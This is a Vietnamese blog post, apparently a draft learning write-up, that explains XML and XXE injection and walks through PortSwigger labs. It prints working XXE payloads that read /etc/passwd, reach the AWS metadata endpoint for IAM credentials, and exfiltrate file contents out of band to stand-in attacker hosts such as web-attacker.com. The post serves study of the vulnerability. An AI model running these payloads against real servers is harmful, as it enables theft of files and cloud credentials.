---
title: XML External Eternity Injection (XXE)
published: 2024-11-23
description: Learning about XXE Vuln
tags: [HTB, Pentest]
category: Learning
author: Trohan0x00
draft: true
image: "/assets/post_image/xxe.png"
---

# XML External Eternity Injection (XXE)
![XXE-Attack_-Real-life-attacks-and-code-examples-copy](https://hackmd.io/_uploads/H1-iHaxzJl.jpg)

## I. XML là gì
* Trước khi tìm hiểu `XXE` là gì, ta cần biết đến file XML là gì? File `XML (Extensible Markup Language)` là một định dạng ngôn ngữ đánh dấu được sử dụng để lưu trữ và truyền dữ liệu một cách có cấu trúc. Dữ liệu trong `XML` được tổ chức thành các phần tử (elements) có thẻ mở và thẻ đóng để chứa thông tin. Ví dụ:
```xml
<student>
    <name>Nguyễn Minh Triết</name>
    <age>20</age>
    <course>Pentesting</course>
</student>
```
* Trong ví dụ trên, `XML` chứa dữ liệu của một sinh viên với các thuộc tính như `name, age, và course`. Các thẻ mở và thẻ đóng như `<name>...</name>`giúp xác định rõ ràng các phần dữ liệu
### 1. Cấu trúc của XML
* File `XML` bao gồm 4 phần chính:
    1. Khai báo `XML`:
    * Khai báo `XML` ở dòng đầu tiên cho biết phiên bản và mã hóa.
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    ```
    2. Phần tử gốc (Root Element):
    * Tài liệu `XML` chỉ có một phần tử gốc bao trùm tất cả các phần tử khác.
    ```xml
    <classrom>...</classrom>
    ```
    3. Các phần tử (Elements):
    * Mỗi phần tử có một thẻ mở và một thẻ đóng, chứa nội dung hoặc các phần tử con khác.
    ```xml
    <student>
    <name>Nguyễn Minh Triết</name>
    <age>20</age>
    <course>Pentesting</course>
    </student>
    ```
    4.Thuộc tính (Attributes):
    * Thuộc tính là các cặp giá trị nằm trong thẻ mở, cung cấp thêm thông tin về phần tử.
    ```xml
    <student id="001">
    <name>Nguyễn Minh Triết</name>
    <age>20</age>
    <course>Pentesting</course>
    </student>
    ```
### 2. XML và JSON
* `XML`: Có cấu trúc dạng cây với các phần tử `(elements)` lồng nhau và thẻ mở, thẻ đóng. `XML` hỗ trợ cả thuộc tính `(attributes)` và nội dung `(text)`, do đó nó có thể mô tả dữ liệu phức tạp hơn.
* `JSON`: Dữ liệu trong `JSON` được tổ chức thành cặp khóa-giá trị `(key-value pairs)` dưới dạng đối tượng `(object)` và mảng `(array)`. Cấu trúc đơn giản, dễ đọc, và gọn gàng hơn XML.
* Để có một cái nhìn tổng quát thì ta sẽ có bảng sau:
#### So sánh XML và JSON

| Đặc điểm             | XML                                                  | JSON                                                   |
|----------------------|------------------------------------------------------|--------------------------------------------------------|
| **Độ dài**           | Lớn, tốn băng thông hơn                              | Nhỏ, hiệu quả hơn trong truyền tải                      |
| **Tính dễ đọc**      | Có thể phức tạp, khó đọc nếu cấu trúc phức tạp       | Dễ đọc, cấu trúc gọn gàng                               |
| **Khả năng xác thực**| Có hỗ trợ xác thực qua DTD hoặc XML Schema           | Không có xác thực chính thức, JSON Schema là giải pháp |
| **Linh hoạt**        | Linh hoạt, hỗ trợ cấu trúc phức tạp                   | Đơn giản hơn, phù hợp với cấu trúc dữ liệu cơ bản       |
| **Hỗ trợ công cụ**   | Rất nhiều công cụ và thư viện                        | Hỗ trợ tốt với JavaScript và dễ sử dụng trong web       |
| **Bảo mật**          | Dễ gặp lỗ hổng XXE                                   | Ít lỗ hổng hơn XML                                      |

---> Hiện nay, `JSON` phổ biến hơn `XML` trong các ứng dụng web và API, đặc biệt là trong giao tiếp giữa client và server. `JSON` được ưa chuộng nhờ tính gọn nhẹ, dễ đọc và dễ xử lý, phù hợp với các ứng dụng hiện đại và tích hợp tốt với JavaScript.

* Ngược lại, `XML` vẫn được sử dụng trong một số hệ thống cũ, cấu hình phần mềm, và dịch vụ `SOAP` nhờ khả năng hỗ trợ cấu trúc dữ liệu phức tạp và xác thực dữ liệu. Tuy nhiên, với sự phát triển của `API RESTful` và nhu cầu trao đổi dữ liệu nhanh chóng, `JSON` đã trở thành lựa chọn phổ biến hơn trong hầu hết các trường hợp hiện nay.

## II. XXE Injection
![XXE](https://hackmd.io/_uploads/H1EeYpez1x.png)
* Đây là một loại lỗ hỏng thuộc dạng `Technical Vulnerability`. Một số ứng dụng sử dụng định dạng `XML` để truyền tải dữ liệu giữa trình duyệt và máy chủ. Các ứng dụng này thường sử dụng một thư viện chuẩn hoặc `API` của nền tảng để xử lý dữ liệu `XML` trên máy chủ. Lỗ hổng `XXE` phát sinh vì đặc tả `XML` chứa các tính năng có thể gây nguy hiểm, và các trình phân tích chuẩn hỗ trợ những tính năng này mặc dù ứng dụng không sử dụng chúng. Ví dụ:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>John Doe</name>
    <bio>&xxe;</bio>
</user>
```
* `DOCTYPE declaration`: Trong đoạn mã này, khai báo `DOCTYPE` định nghĩa một thực thể bên ngoài có tên `xxe` với giá trị là tệp hệ thống `/etc/passwd`. Tệp này chứa thông tin người dùng trong hệ điều hành Unix/Linux.
* Tham chiếu thực thể: Thực thể `&xxe;` được sử dụng trong phần tử `<bio>`. Khi tài liệu `XML` này được xử lý, giá trị của thực thể `xxe` (được định nghĩa là tệp `/etc/passwd)` sẽ được chèn vào trong nội dung của phần tử `<bio>`, thay vì tên của người dùng.

### 1. Các loại tấn công `XXE`
* Có nhiều loại tấn công XXE khác nhau:
* Khai thác `XXE` để lấy các tập tin, nơi một thực thể bên ngoài được định nghĩa chứa nội dung của một tập tin và trả lại trong phản hồi của ứng dụng.
* Khai thác `XXE` để thực hiện tấn công `SSRF`, nơi một thực thể bên ngoài được định nghĩa dựa trên một `URL` đến hệ thống back-end.
* Khai thác `Blind XXE` để trích xuất dữ liệu ngoài băng thông, nơi dữ liệu nhạy cảm được truyền từ máy chủ ứng dụng đến hệ thống mà kẻ tấn công kiểm soát.
* Khai thác `Blind XXE` để lấy dữ liệu qua thông báo lỗi, nơi kẻ tấn công có thể kích hoạt một thông báo lỗi phân tích chứa dữ liệu nhạy cảm.

### 2. Thực hành Labs (P1)
* Để hiểu rõ cơ chế và cách khai thác thì ta sẽ tiến hành thực hành các labs, mình sẽ chọn các labs ở PortSwigger để dễ tiếp cận 

#### 1. **Lab: Exploiting XXE using external entities to retrieve files**
* Lab đầu của ta cũng sẽ đơn giản, làm quen với syntax và cũng như loại `XXE` đơn giản nhất.
![image](https://hackmd.io/_uploads/HJ6zp0lzJe.png)
* Website ta sẽ có ô để thực hiện việc checkstock của đơn hàng, mình sẽ bắt request lại bằng `Burp` để tiến hành khai thác.
![image](https://hackmd.io/_uploads/ByTwTCgf1l.png)
* Khi thực hiện gửi một `Post Request` đến sever ta sẽ thấy được phần mã `XML` được gửi kèm theo để thực hiện truy vấn thuộc tính `productID` và `StoreID`, đoạn mã `XMl` có dạng như sau:
```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```
* Ta thử sửa đoạn mã để xảy ra lỗi cú pháp bằng cách thêm `"` vào tag `xml`
![image](https://hackmd.io/_uploads/S1iwRClGyg.png)
* Ta thấy server đã dẫn đến lỗi syntax, từ đấy ta biết được `XML Parser` có thực hiện việc truy xuất dữ liệu do ta nhập vào, để chắc hơn mình sẽ thử nhập `&lt;` để thực hiện tham chiếu, vì nếu `XML Parser` truy xuất dữ liệu của ta thì `&lt;` sẽ được chuyển thành dấu `<`
![image](https://hackmd.io/_uploads/H1nk1J-fJl.png)
* Vậy là đã biết được ta có thể thực hiện việc XXE mà không gây trở ngại gì. Ta có Payload sau
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE  foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>
&xxe;</productId><storeId>1</storeId></stockCheck>
```
* Ta thực hiện khai báo thêm `DTD` là `<!DOCTYPE  foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` và tạo ra thực thể xxe để thực hiện việc đọc file ở đường dẫn `/etc/paswd` trên hệ thống. Vầ bên dưới sẽ gọi `&xxe` để thực hiện tham chiếu, kết quả sẽ leak được toàn bộ dữ liệu từ `/etc/passwd`
![image](https://hackmd.io/_uploads/BkwPx1bGye.png)
#### 2. **Lab: Exploiting XXE to perform SSRF attacks**
* Labs này sẽ dùng `XXE`để tạo đà nhằm thực hiện `SSRF`.
* Ngoài việc lấy dữ liệu nhạy cảm, tác động chính khác của `XXE` là chúng có thể được sử dụng để thực hiện tấn công `SSRF`.
* Để khai thác `XXE` để thực hiện tấn công `SSRF`, ta cần định nghĩa một thực thể `XML` bên ngoài sử dụng `URL` mà ta muốn tấn công, và sử dụng thực thể đã định nghĩa trong một giá trị dữ liệu. Tức là ở đây thay vì ta đọc dữ liệu từ `/etc/passwd` như lab trước thì ta có thể dùng `SYSTEM` để đọc được một `URL` để thực hiện SSRF, ta sẽ tìm hiểu với lab này
![image](https://hackmd.io/_uploads/Hy0r-1ZzJx.png)
* Server lab đang được chạy trên `EC2` metadata của `AWS`. Nói sơ về `http://169.254.169.254` thì đây là địa chỉ IP nội bộ đặc biệt, được các dịch vụ điện toán đám mây như `AWS, Google Cloud, và Azure` sử dụng để cung cấp `metadata (siêu dữ liệu)` cho các máy ảo `(VM)` mà người dùng chạy trên hạ tầng của họ. `Metadata` này chứa thông tin về máy ảo, như `ID` của `instance`, loại `instance`, vùng, vùng sẵn sàng, khóa `SSH`, và nhiều thông tin khác.
* Tiến hành khai thác lab, và vẫn sẽ bắt request `Check Stock` như lab đầu tiên 
![image](https://hackmd.io/_uploads/r1UUJg-Gkg.png)
* Ta vẫn sẽ nhận về được kết quả check stock, có payload sau
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY url SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>
&url;
</productId><storeId>1</storeId></stockCheck>
```
* Ta sẽ thực hiện tạo `ENTITY` là `url` và truy xuất đến url `http://169.254.169.254/` 
![image](https://hackmd.io/_uploads/S1IGxx-M1l.png)
* Kết quả sẽ được trả về là latest, tiếp theo ta cần inject được url `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`. Vì `AWS` sẽ sử dụng endpoint này để cung cấp thông tin xác thực tạm thời cho các ứng dụng chạy trên `instance`, cho phép truy cập vào các dịch vụ của `AWS` khác mà không cần lưu trữ thông tin xác thực nguồn, vì thế để truy truy xuất được `KEY` mà đề bài yêu cầu ta sẽ cần truy xuất đến `/latest/meta-data/iam/security-credentials/admin`
![image](https://hackmd.io/_uploads/SJP2lxbG1l.png)
### 3. Blind XXE
* Trước khi đến với các lab tiếp theo, ta sẽ nói đến Blind XXE. 
* `Blind XXE` xảy ra khi ứng dụng dễ bị tấn công `XML External Entity Injection` nhưng không trả về giá trị của bất kỳ thực thể bên ngoài nào trong phản hồi của nó. Điều này có nghĩa là việc lấy trực tiếp các tệp từ phía máy chủ là không thể, do đó `Blind XXE` thường khó khai thác hơn so với lỗ hổng `XXE` thông thường.
* Có hai cách phổ biến để phát hiện và khai thác lỗ hổng blind XXE:
    * Kích hoạt tương tác mạng ngoài băng (out-of-band interaction), đôi khi có thể tiết lộ dữ liệu nhạy cảm trong thông tin tương tác.
    * Kích hoạt lỗi phân tích XML để lấy dữ liệu nhạy cảm thông qua thông báo lỗi.
#### 1. Detect Blind XXE OAST 
* Có thể phát hiện `Blind XXE` bằng cách sử dụng kỹ thuật tương tự như tấn công `XXE SSRF (Server-Side Request Forgery)`, nhưng lần này sẽ kích hoạt tương tác mạng ngoài băng đến một hệ thống mà bạn kiểm soát. Ví dụ:
    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
    ```
* Thực thể `xxe` này sẽ được sử dụng trong một giá trị dữ liệu trong `XML`, làm cho máy chủ gửi một yêu cầu `HTTP` đến `URL` chỉ định. Kẻ tấn công có thể theo dõi tra cứu `DNS` và yêu cầu `HTTP` để xác nhận rằng tấn công `XXE` đã thành công.
* Đôi khi, `XXE` sử dụng thực thể thông thường bị chặn do ứng dụng có filtered `XML parser`. Trong trường hợp này, ta có thể sử dụng `XML parameter entities` thay thế. `XML parameter entities` là một loại thực thể `XML` đặc biệt chỉ có thể được tham chiếu trong DTD. `Parameter entity` được khai báo và tham chiếu bằng ký tự %
    ```xml
    <!ENTITY %myparameterentity "Giá trị của parameter entity">
    ```
* Và khi muốn tham chiếu đến parameter entity này, ta sử dụng ký tự % thay vì ký tự & thông thường: `%myparameterentity;
* Trong tấn công XXE (XML External Entity), kẻ tấn công có thể khai thác parameter entities khi các general entities bị chặn hoặc giới hạn bởi cấu hình bảo mật. `Parameter entities` có thể giúp vượt qua những rào cản này vì chúng được sử dụng trong DTD và có thể gây ra các tương tác mạng ngầm nếu chúng chứa liên kết đến một hệ thống bên ngoài.`

#### 2. Exploit Blind XXE OAST
* Khi ta đã có thể xác định hệ thống bị lỗ hỏng `XXE` và có thể `OAST`, thì từ đây ta có thể tận dụng lỗ hỏng để dễ dàng leak data ra bên ngoài. Ta phải dùng đến `OAST` để thực hiện Blind vì ta thấy dữ liệu không được hiển thị trực tiếp lên màn hình, bằng cách lưu trữ một `DTD (Document Type Definition)` độc hại trên một hệ thống do ta kiểm soát, và sau đó gọi `DTD` này từ payload `XXE`.
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-    attacker.com/?x=%file;'>">
    %eval;
    %exfiltrate;
    ```

    * Định nghĩa một `parameter entity` tên `file`, chứa nội dung của tệp `/etc/passwd`.
    * Định nghĩa thêm một `parameter entity` tên `eval`, chứa một khai báo động của một `parameter entity` khác tên là `exfiltrate`. Thực thể `exfiltrate` sẽ được đánh giá bằng cách gửi cầu `HTTP` đến máy chủ web của kẻ tấn công, chứa giá trị của thực thể `file` trong chuỗi truy vấn `URL`.
    * Sử dụng thực thể `eval`, điều này kích hoạt khai báo động của thực thể `exfiltrate`.
    * Sử dụng thực thể `exfiltrate`, giá trị của nó sẽ được đánh giá bằng cách yêu cầu `URL` đã chỉ định.
--> Để hiểu hơn thì ta sẽ tiến hành thực hiện 1 lab, 
--> **Lab 1: Exploiting blind XXE to exfiltrate data using a malicious external DTD**
![image](https://hackmd.io/_uploads/S1m9ngGfyx.png)
* Lab vẫn như các bài trước, server đã cho ta sẵn một `server` riêng để exploit từ đó có thể gửi data leak được đến server này.
![image](https://hackmd.io/_uploads/Hyi4alfzyx.png)
* Như ta thấy, exploit theo cách thông thường sẽ không được vì server đã `filtered`, thậm chí cả cách thực hiện `paramteter entity` cũng không thành công, giờ ta sẽ xem thử `exploit server` có gì
![image](https://hackmd.io/_uploads/H1Ou6gMMyx.png)
* Dường như nó là một `HTTP Server` để nhận Respone, ta có thể code payload ở phần body
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM     'http://BURP-COLLABORATOR-    SUBDOMAIN/?x=%file;'>">
    %eval;
    %exfil;
    ```
* sau đó ở phía post request ở server ta sẽ sửa `XML` như sau:
    ```xml
    
    <?xml version="1.0"     encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY %     xxe SYSTEM "YOUR-DTD-    URL"> %xxe;]>
    <stockCheck>    <productId>1</productId>    <storeId>1</storeId>    </stockCheck>
    ```
* Cụ thể quy tắt hoạt động của việc khai thác này như sau:

    1. Ta sẽ vào `exploit server` để tạo payload và lấy url exploit từ đây, với thực thể `exfile` sẽ thực hiện truy cập đến link `Burp Collaborator`
    ![image](https://hackmd.io/_uploads/H1KwnMGfJg.png)
    2. Sau đó ta sẽ sửa payload của file `XML`, dễ hiểu là khi ta run đoạn mã này thì thực thể `%xxe` được kích hoạt và truy cập đến link `exploit server`, mà ở exploit server ta sẽ có thực thể `file` phụ trách việc đọc đường dẫn `/etc/hostname`, sau đó thực thể `eval` sẽ khởi tạo thêm thực thể `exfile` để thực hiện truy cập đến `Burp Collaborator`
    ![image](https://hackmd.io/_uploads/Hk6AnfGMkl.png)
    3. Bước tiếp theo, sau khi gửi request post đã sửa thì ta sẽ `poll now` ở `Burp Collaborator`. Khi request được gửi như tiến trình trên thì ta sẽ có step lần lượt là `%xxe; gửi request đến exploit server` --> `exploit server sẽ khởi tạo file và eval để thực hiện việc đọc đường đẫn ở /etc/hostname` --> `tiếp đó là kết quả sẽ được gửi về Burp Collaborator` chính vì thế khi ta poll về ta sẽ nhận được request được trả về 
    ![image](https://hackmd.io/_uploads/HJOOymGfyg.png)
    4. Kết quả nội dung `etc/hostname` sẽ được trả về ở request gửi đến `Burp Collaborator` 
    ![image](https://hackmd.io/_uploads/ByZ2gQzfJe.png)

--> **Lab 2: Exploiting blind XXE to retrieve data via error messages** 
* Lab này sẽ thuộc về `Blind `nhưng sử dụng thông báo lỗi để truy xuất dữ liệu. Một cách tiếp cận khác để khai thác lỗ hổng `Blind XXE` là kích hoạt một lỗi phân tích `XML` mà thông báo lỗi này chứa dữ liệu nhạy cảm mà bạn muốn lấy. Phương pháp này hiệu quả nếu ứng dụng trả lại thông báo lỗi trong phản hồi của nó.
    ```xml
    <!ENTITY % file SYSTEM     "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY     &#x25; error SYSTEM     'file:///nonexistent/%file;'>    ">
    %eval;
    %error;
    ```
* DTD độc hại này thực hiện các bước sau:

    * Định nghĩa một `parameter entity` tên `file`, chứa nội dung của tệp `/etc/passwd`.
    * Định nghĩa một `parameter entity` tên `eval`, trong đó có một khai báo động của một `parameter entity` khác tên là `error`. Thực thể `error` sẽ tải một tệp không tồn tại, với tên tệp chứa giá trị của thực thể `file`.
    * Sử dụng thực thể `eval`, điều này khiến khai báo động của thực thể `error` được thực thi.
    * Sử dụng thực thể `error`, khiến giá trị của nó được đánh giá bằng cách cố gắng tải tệp không tồn tại, dẫn đến một thông báo lỗi chứa tên của tệp không tồn tại, chính là nội dung của tệp `/etc/passwd`.
    * Khi hệ thống không tìm thấy tệp, nó sẽ trả về một thông báo lỗi, trong đó bao gồm cả đường dẫn lỗi mà kẻ tấn công đã cố tình chèn nội dung của `/etc/passwd`. Nhờ vậy, thông báo lỗi này sẽ chứa một phần hoặc toàn bộ nội dung của `/etc/passwd` mà kẻ tấn công muốn lấy.
* Đến với việc thực hiện làm, vẫn sẽ là việc check stock như bình thường và nhận về một chuỗi `XML`. Thực hiện thay đổi và tạo `ENTITY` như sau:
![image](https://hackmd.io/_uploads/B1aSu4MGye.png)
* `ENTITY` `%xxe` được tạo để gọi đến `exploit server`, ở phần `exploit server` sẽ tạo thêm payload ở body
![image](https://hackmd.io/_uploads/B19ju4fGke.png)
* Dùng để tạo thêm 2 thực thể như đã nói ở trên dùng để gọi ra một đường dẫn không tồn tại kèm theo đó là `/etc/passwd`
![image](https://hackmd.io/_uploads/ByDBK4MMkx.png)
* Kết quả khi gửi request đi, ta sẽ nhận được một thông báo lỗi `"XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash` đây là việc server đã thực thi mã `XML` ta đã sửa nhưng truy cập vào `exploit server` và không thể tìm được đường dẫn `file:///invalid` mà ta chỉ định ở `exploit server` nhưng ta đã thêm lệnh gán `%file` vào ở sau, nên do đó `XML parser` đã thực thi luôn lệnh `/etc/passwd` và trả cho ta ra toàn bộ file có trong đường dẫn này.

--> Final Lab: **Exploiting blind XXE by repurposing a local DTD**
* Kỹ thuật trước đây hoạt động tốt với `DTD ngoại vi (external DTD)`, nhưng nó thường không hoạt động với `DTD nội bộ (internal DTD)` được chỉ định đầy đủ trong phần tử `DOCTYPE`. Điều này là vì kỹ thuật này liên quan đến việc sử dụng một tham số `XML entity` trong định nghĩa của một tham số entity khác. Theo đặc tả `XML`, điều này được phép trong `DTD` ngoại vi nhưng không được phép trong `DTD` nội bộ (một số trình phân tích cú pháp có thể chấp nhận, nhưng nhiều trình phân tích không cho phép).
* Vậy nếu sẽ ra sau, khi ta không thể khai thác `Blind XXE` thông qua `OAST` được nữa? Ta không thể lấy dữ liệu qua kết nối ngoài băng thông và cũng không thể tải `DTD ngoại vi` từ máy chủ từ xa. Trong trường hợp này, vẫn có thể kích hoạt các thông báo lỗi chứa dữ liệu nhạy cảm nhờ một kẽ hở trong đặc tả ngôn ngữ `XML`. Nếu `DTD` của tài liệu sử dụng kết hợp giữa các khai báo DTD nội bộ và ngoại vi, thì `DTD` nội bộ có thể tái định nghĩa các entities đã được khai báo trong `DTD` ngoại vi. Khi điều này xảy ra, hạn chế việc sử dụng tham số `XML entity` trong định nghĩa của một tham số `entity` khác sẽ được nới lỏng
* Ví dụ, các hệ thống Linux sử dụng môi trường desktop `GNOME` thường có một tệp `DTD` tại ``/usr/share/yelp/dtd/docbookx.dtd`. Ta có thể kiểm tra xem tệp này có tồn tại hay không bằng cách gửi payload `XXE` sau, sẽ gây ra lỗi nếu tệp này không có:
    ```xml
       <!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    %local_dtd;
    ]>
    ```
* Sau khi đã thử danh sách các tệp `DTD` phổ biến để tìm tệp có sẵn, ta cần lấy bản sao của tệp đó và xem qua để tìm một `entity` mà bạn có thể tái định nghĩa. Vì nhiều hệ thống phổ biến bao gồm các tệp `DTD` mã nguồn mở, bạn thường có thể dễ dàng lấy bản sao của các tệp này thông qua tìm kiếm trên internet.
* Đến với lab thì ta sẽ bắt được request check stock và tiến hành sửa đổi `XML`
    ![image](https://hackmd.io/_uploads/ryg_6rGf1l.png)
    * `local_dtd` trỏ tới tệp DTD có sẵn trên hệ thống `(/usr/local/app/schema.dtd)`.
    * `custom_entity` được tái định nghĩa để chứa mã khai thác XXE, yêu cầu đọc tệp `/etc/passwd` (một tệp quan trọng chứa thông tin về người dùng).
    * `eval` và `error` là các `entity` được sử dụng để kích hoạt lỗi và trả về nội dung từ tệp `/etc/passwd`.

![image](https://hackmd.io/_uploads/BkanTrfMJe.png)
* Kết quả ta có thể dễ dàng leak được dữ liêụ từ `/etc/passwd` mà không cần thông qua `OAST`

